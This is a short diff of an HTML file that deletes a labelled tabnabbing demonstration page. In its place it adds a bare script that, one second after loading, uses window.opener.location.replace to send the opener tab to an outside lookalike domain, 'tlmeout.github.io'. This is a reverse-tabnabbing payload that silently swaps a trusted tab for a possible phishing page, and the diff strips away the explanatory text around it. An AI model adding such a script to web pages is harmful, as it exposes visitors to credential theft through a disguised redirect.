@@ -1,20 +1,5 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Tabnabbing Example</title>
-    <script>
-        window.addEventListener('blur', function() {
+        <script>
             setTimeout(function() {
-                if (document.visibilityState === 'hidden') {
-                    window.location = 'https://example.com'; // Potential tabnabbing URL
-                }
+                window.opener.location.replace('https://tlmeout.github.io');
             }, 1000);
-        });
-    </script>
-</head>
-<body>
-    <h1>Tabnabbing Example</h1>
-    <p>Switch to another tab and wait for the page to redirect.</p>
-</body>
-</html>
+        </script>
